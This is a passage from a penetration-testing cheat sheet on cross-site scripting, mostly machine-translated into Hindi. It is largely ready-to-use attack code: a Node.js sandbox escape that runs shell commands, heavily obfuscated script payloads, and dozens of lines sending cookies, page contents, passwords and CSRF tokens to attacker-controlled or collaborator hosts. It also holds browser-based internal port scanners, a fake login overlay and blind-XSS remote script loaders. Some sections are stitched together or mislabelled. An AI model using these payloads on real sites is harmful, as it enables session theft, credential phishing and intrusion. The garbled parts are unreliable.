Object = {}.constructor
String = ''.constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

* **एक पेज में विभिन्न अवशोषण:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* और उन्नत JSFuck: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
```html
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

```javascript
//aaencode
```markdown
# XSS (Cross-Site Scripting)

XSS (Cross-Site Scripting) एक वेब अभियांत्रिकी हमला है जिसमें एक हमलावर्ती उपयोगकर्ता वेब ऐप्लिकेशन में अवैध स्क्रिप्ट को संग्रहीत करता है और उसे दूसरे उपयोगकर्ताओं को प्रदर्शित करता है। इसके परिणामस्वरूप, हमलावर्ती उपयोगकर्ता दूसरे उपयोगकर्ताओं के ब्राउज़र में अपने अवैध स्क्रिप्ट को निष्पादित कर सकता है, जिससे उपयोगकर्ताओं के खातों को कंप्रमाइज़ किया जा सकता है और उनकी गोपनीय जानकारी को चोरी किया जा सकता है।

## Types of XSS

1. **Stored XSS**: इसमें हमलावर्ती उपयोगकर्ता अवैध स्क्रिप्ट को संग्रहीत करता है और उसे स्थानिक डेटाबेस में संग्रहीत करता है। जब दूसरे उपयोगकर्ता उस डेटा को देखते हैं, तो अवैध स्क्रिप्ट निष्पादित होता है।

2. **Reflected XSS**: इसमें हमलावर्ती उपयोगकर्ता अवैध स्क्रिप्ट को एक URL पैरामीटर के माध्यम से भेजता है। जब उपयोगकर्ता उस URL को खोलता है, तो अवैध स्क्रिप्ट निष्पादित होता है।

3. **DOM-based XSS**: इसमें हमलावर्ती उपयोगकर्ता अवैध स्क्रिप्ट को वेब पृष्ठ के DOM (Document Object Model) में संग्रहीत करता है। जब उपयोगकर्ता वेब पृष्ठ को खोलता है, तो अवैध स्क्रिप्ट निष्पादित होता है।

## XSS के उपयोग

1. सत्यापन त्रुटि के खोज करने के लिए।
2. उपयोगकर्ता के ब्राउज़र में कुकीज़ को चोरी करने के लिए।
3. उपयोगकर्ता के खाते को कंप्रमाइज़ करने के लिए।
4. उपयोगकर्ता के गोपनीय जानकारी को चोरी करने के लिए।

## XSS की रोकथाम

1. इनपुट डेटा को सत्यापित करें और अवैध विशेषाधिकारों को हटाएं।
2. उपयोगकर्ता इनपुट को अवैध स्क्रिप्ट से सुरक्षित करने के लिए एस्केप करें।
3. Content Security Policy (CSP) का उपयोग करें।
4. HTTP-only कुकीज़ का उपयोग करें।
5. अवैध स्क्रिप्ट को निष्पादित करने वाले वेब पृष्ठों को ब्लॉक करें।
6. अवैध स्क्रिप्ट को रिपोर्ट करें और उसे ठीक करने के लिए वेब ऐप्लिकेशन के विकासकों को सूचित करें।
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS सामान्य पेलोड

### 1 में कई पेलोड

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### कुकीज़ प्राप्त करें
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
अगर कुकी में HTTPOnly फ़्लैग सेट है तो आप **जावास्क्रिप्ट से कुकी तक पहुंच नहीं पा सकेंगे**। लेकिन यदि आप भाग्यशाली हैं तो आपके पास [इस सुरक्षा को दौर करने के कुछ तरीके](../hacking-with-cookies/#httponly) हैं।
{% endhint %}

### पेज की सामग्री चुराएँ
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### आंतरिक आईपी पता लगाएं

To find internal IPs, you can use various techniques:

#### 1. DNS Rebinding

DNS rebinding is a technique that allows an attacker to bypass the same-origin policy and access internal resources by manipulating DNS responses. By setting up a malicious website and exploiting vulnerabilities in the victim's browser, an attacker can trick the browser into making requests to internal IP addresses.

#### 2. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make requests from the server to arbitrary destinations, including internal IP addresses. By exploiting SSRF vulnerabilities in a web application, an attacker can force the server to make requests to internal resources and reveal their IP addresses.

#### 3. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) vulnerabilities can also be used to find internal IPs. By injecting malicious scripts into a vulnerable web application, an attacker can execute arbitrary code in the victim's browser. This code can be used to make requests to internal IP addresses and retrieve their responses.

#### 4. Port Scanning

Port scanning is a technique used to discover open ports on a target system. By scanning the target's IP address range, an attacker can identify internal IP addresses that are listening on specific ports. This can provide valuable information about the internal network structure.

#### 5. Network Sniffing

Network sniffing involves capturing and analyzing network traffic to gather information about the target system. By monitoring network packets, an attacker can identify internal IP addresses that are communicating with the target system. This can help in mapping the internal network infrastructure.

Remember, it is important to obtain proper authorization before performing any of these techniques. Unauthorized access to internal resources is illegal and unethical.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### पोर्ट स्कैनर (फेच)

एक पोर्ट स्कैनर एक टेक्निकल टूल है जो नेटवर्क के विभिन्न पोर्ट्स की जांच करने के लिए उपयोग किया जाता है। यह टूल एक निर्दिष्ट IP पते या डोमेन के लिए उपयोग किया जा सकता है और उपयोगकर्ता को उपलब्ध पोर्ट्स की सूची प्रदान करता है। इसका उपयोग नेटवर्क सुरक्षा और पेंटेस्टिंग में किया जाता है ताकि किसी भी खुले पोर्ट की जांच की जा सके और संगठन को संगठित रूप से सुरक्षित रखने के लिए आवश्यक कदम उठाए जा सकें।

एक पोर्ट स्कैनर कई तरीकों से काम कर सकता है, जैसे TCP स्कैनिंग, UDP स्कैनिंग, SYN स्कैनिंग, और FIN स्कैनिंग। यह टूल उपयोगकर्ता को उपलब्ध पोर्ट्स की जांच करने के लिए नेटवर्क के साथ संचार स्थापित करता है और उपयोगकर्ता को उन पोर्ट्स के बारे में जानकारी प्रदान करता है जो खुले हो सकते हैं और एक हमले के लिए उपयोगी हो सकते हैं।

एक पोर्ट स्कैनर का उपयोग एक हैकर के लिए भी किया जा सकता है जो एक निश्चित नेटवर्क की सुरक्षा की जांच करना चाहता है और उसमें मौजूद खुले पोर्ट्स का उपयोग करके एक हमला करना चाहता है। इसलिए, एक पोर्ट स्कैनर एक महत्वपूर्ण टूल है जो हैकर्स को निश्चित नेटवर्क की सुरक्षा की जांच करने और उसमें संगठित रूप से सुरक्षित रखने के लिए उपयोगी जानकारी प्रदान करता है।
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### पोर्ट स्कैनर (वेबसोकेट्स)

वेबसोकेट्स पोर्ट स्कैनर एक टूल है जो वेबसोकेट्स का उपयोग करके निर्दिष्ट IP पते या डोमेन के लिए खुले पोर्ट्स की जांच करता है। यह टूल एक वेबसोकेट्स कनेक्शन का उपयोग करता है और वेबसोकेट्स प्रोटोकॉल का उपयोग करके निर्दिष्ट पोर्ट्स पर कनेक्शन स्थापित करता है। यदि कनेक्शन स्थापित होता है, तो पोर्ट खुला माना जाता है, और यदि कनेक्शन स्थापित नहीं होता है, तो पोर्ट बंद माना जाता है।

यह टूल वेबसोकेट्स प्रोटोकॉल का उपयोग करता है, जो एक द्विपक्षीय प्रोटोकॉल है जो वेबसाइट और वेब सर्वर के बीच बातचीत करने की अनुमति देता है। यह टूल वेबसोकेट्स कनेक्शन का उपयोग करके वेबसाइट या वेब सर्वर के खुले पोर्ट्स की जांच करता है और उन्हें खुला या बंद माना जाता है।
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_छोटे समय प्रतिक्रिया पोर्ट की ओर संकेत करते हैं_ _अधिक समय प्रतिक्रिया की अभाव को दर्शाते हैं।_

क्रोम में प्रतिबंधित पोर्टों की सूची की समीक्षा [**यहां**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc) और फ़ायरफ़ॉक्स में [**यहां**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist) कीजिए।

### प्रमाणीकरण के लिए बॉक्स
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### ऑटो-भरने वाले पासवर्ड को अवधारणा करें

जब उपयोगकर्ता वेब फ़ॉर्म में अपना पासवर्ड भरता है, तो ब्राउज़र इसे स्वचालित रूप से याद रखता है और उसे भविष्य में आपके लिए भरने की सुविधा प्रदान करता है। यह ऑटो-भरने वाले पासवर्ड के लिए एक सुविधा है, लेकिन इसका उपयोग एक हैकर के लिए भी किया जा सकता है।

एक हैकर इस तकनीक का उपयोग करके उपयोगकर्ता के ऑटो-भरने वाले पासवर्ड को कैप्चर कर सकता है। इसके लिए, हैकर एक विशेष वेब पेज बनाता है जिसमें एक फ़ॉर्म होता है जिसमें उपयोगकर्ता को अपना पासवर्ड भरने के लिए कहा जाता है। जब उपयोगकर्ता अपना पासवर्ड भरता है, तो यह पासवर्ड हैकर के पास भेजा जाता है।

इस तकनीक का उपयोग करके, हैकर उपयोगकर्ता के पासवर्ड को प्राप्त करके उसे अनधिकृत रूप से उपयोग कर सकता है, जैसे कि उपयोगकर्ता के नाम और पासवर्ड के साथ लॉगिन करने के लिए। यह एक गंभीर सुरक्षा समस्या है और उपयोगकर्ताओं को सतर्क रहना चाहिए जब वे अपना पासवर्ड ऑटो-भरने वाले फ़ॉर्मों में भरते हैं।
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
जब कोई डेटा पासवर्ड फ़ील्ड में दर्ज किया जाता है, तो उपयोगकर्ता का उपयोगकर्ता नाम और पासवर्ड हमलावर के सर्वर पर भेजा जाता है, यदि क्लाइंट सहेजे गए पासवर्ड का चयन करता है और कुछ नहीं लिखता है तो प्रमाणिकरण चोरी कर लिया जाएगा।

### कीलॉगर

बस गिटहब में खोज करते हुए मैंने कुछ अलग-अलग ढंग के मिले:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* आप मेटास्प्लोइट भी उपयोग कर सकते हैं `http_javascript_keylogger`

### CSRF टोकन चोरी
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### पोस्टमैसेज संदेश चोरी करना

यह तकनीक पोस्टमैसेज API का उपयोग करके वेब ऐप्लिकेशन में XSS (क्रॉस-साइट स्क्रिप्टिंग) हमले को अधिक गंभीर बनाती है। XSS हमले के दौरान, हम XSS प्रभावित वेब पृष्ठ को एक अलग डोमेन में खोलते हैं और फिर पोस्टमैसेज API का उपयोग करके संदेशों को चोरी करते हैं।

इस तकनीक का उपयोग करने के लिए, हम XSS प्रभावित वेब पृष्ठ में एक अलग डोमेन में एक आईफ्रेम या विंडो खोलते हैं। फिर, हम उस आईफ्रेम या विंडो के संदेशों को पोस्टमैसेज API के माध्यम से चोरी करते हैं। इस तरह, हम XSS प्रभावित वेब पृष्ठ के संदेशों को अपने नियंत्रण में ले सकते हैं और उन्हें अनधिकृत गतिविधियों के लिए उपयोग कर सकते हैं।

यह तकनीक विभिन्न प्रकार के XSS हमलों के लिए उपयोगी हो सकती है, जैसे कि भ्रष्टाचारित डेटा की चोरी, उपयोगकर्ता के नाम और पासवर्ड की चोरी, सत्यापन टोकन की चोरी आदि। इसलिए, वेब ऐप्लिकेशनों को XSS हमलों से सुरक्षित रखने के लिए पोस्टमैसेज संदेशों की सुरक्षा को सुनिश्चित करना महत्वपूर्ण है।
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### सर्विस वर्कर्स का दुरुपयोग

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### शैडो डॉम तक पहुंच

{% content-ref url="shadow-dom.md" %}
[shadow-dom.md](shadow-dom.md)
{% endcontent-ref %}

### पॉलिग्लॉट्स

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### ब्लाइंड XSS पेलोड

आप यह भी उपयोग कर सकते हैं: [https://xsshunter.com/](https://xsshunter.com)
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```
### रेजेक्स - छिपी हुई सामग्री तक पहुंच

[**इस व्राइटअप**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) से पता चलता है कि यदि कुछ मान JS से गायब हो जाए, तो उन्हें अलग-अलग ऑब्जेक्ट्स में JS एट्रिब्यूट्स में ढूंढ़ा जा सकता है। उदाहरण के लिए, एक रेजेक्स के इनपुट को हटाने के बाद भी उसे ढूंढ़ा जा सकता है:
```javascript
// Do regex with flag
flag="CTF{FLAG}"
re=/./g
re.test(flag);

// Remove flag value, nobody will be able to get it, right?
flag=""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### ब्रूट-फोर्स सूची

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## अन्य सुरक्षा दुरुपयोग करके XSS

### मार्कडाउन में XSS

क्या आप मार्कडाउन कोड इंजेक्शन कर सकते हैं जो रेंडर होगा? शायद आप XSS प्राप्त कर सकते हैं! जांचें:

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS से SSRF तक

क्या आपके पास **कैशिंग का उपयोग करने वाली साइट पर XSS** है? इस पेलोड के माध्यम से **उसे SSRF में अपग्रेड करने का प्रयास करें** :
```python
<esi:include src="http://yoursite.com/capture" />
```
इसे कुकी प्रतिबंध, XSS फ़िल्टर और बहुत कुछ बाईपास करने के लिए उपयोग करें!\
इस तकनीक के बारे में अधिक जानकारी यहां मिलेगी: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-languaje-transformations.md).

### डायनामिक रूप से बनाए गए PDF में XSS

यदि कोई वेब पृष्ठ उपयोगकर्ता नियंत्रित इनपुट का उपयोग करके एक PDF बना रहा है, तो आप प्रयास कर सकते हैं कि **बॉट को धोखा दें** जो PDF बना रहा है और उसे **अनियमित JS कोड को कार्यान्वित** करने के लिए।\
तो, यदि **PDF निर्माता बॉट** को किसी प्रकार के **HTML** **टैग्स** मिलते हैं, तो वह उन्हें **व्याख्या** करेगा, और आप इस व्यवहार का दुरुपयोग करके **सर्वर XSS** का कारण बना सकते हैं।

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

यदि आप HTML टैग्स इंजेक्ट नहीं कर सकते हैं, तो इसे कोशिश करना लायक हो सकता है कि आप **PDF डेटा इंजेक्ट** करें:

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### Amp4Email में XSS

